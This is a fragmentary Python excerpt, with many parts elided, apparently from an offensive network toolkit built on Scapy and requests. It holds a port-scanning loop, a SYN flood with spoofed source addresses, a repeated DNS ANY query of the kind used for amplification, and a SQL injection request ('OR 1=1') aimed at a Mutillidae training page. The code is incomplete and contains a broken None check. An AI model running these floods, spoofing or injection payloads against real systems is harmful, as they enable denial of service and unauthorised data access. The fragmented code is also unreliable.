    ...
    for port in ports_list:
        ...
        if type(tcp_connect_scan_resp) is None:
            ...
            if tcp_connect_scan_resp.getlayer(TCP).flags == 0x12:
                send_rst = sr(
                    IP(dst=target) / TCP(sport=src_port, dport=port, flags="AR"),
                    timeout=2,
                    verbose=0,
                )
...
"""
    ...
    def spoofed_flood():
        while True:
            send(
                IP(src="192.168.222." + str(random.randint(2, 253)), dst=target)
                / TCP(dport=139, flags="S")
    ...
    try:
        while True:
            packet = (
                ...
                / DNS(rd=1, qd=DNSQR(qname="google.com", qtype=255))
            )
...
"""
    ...
    r = requests.post(
        "http://"
        + target
        + "/mutillidae/index.php?page=user-info.php&username='+OR+1%3D1+--+'&password=&user-info-php-submit-button=View+Account+Details",
